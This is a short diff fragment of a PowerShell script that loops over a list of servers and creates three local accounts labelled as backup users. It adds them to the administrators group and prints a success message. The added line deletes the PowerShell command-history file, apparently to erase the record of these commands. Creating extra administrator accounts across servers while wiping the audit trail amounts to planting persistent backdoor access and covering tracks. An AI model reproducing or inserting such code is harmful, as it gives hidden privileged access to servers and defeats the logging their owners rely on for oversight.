@@ -391,6 +391,7 @@ $ServersList | %{
     		net user $backup2 $backuppass2 /add
  		net user $backup3 $backuppass3 /add
    		net localgroup administrators $backup1 $backup2 $backup3 /add
+     		del $env:username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 	}
  	write-host "backup users created on $_" -foregroundcolor green
 }
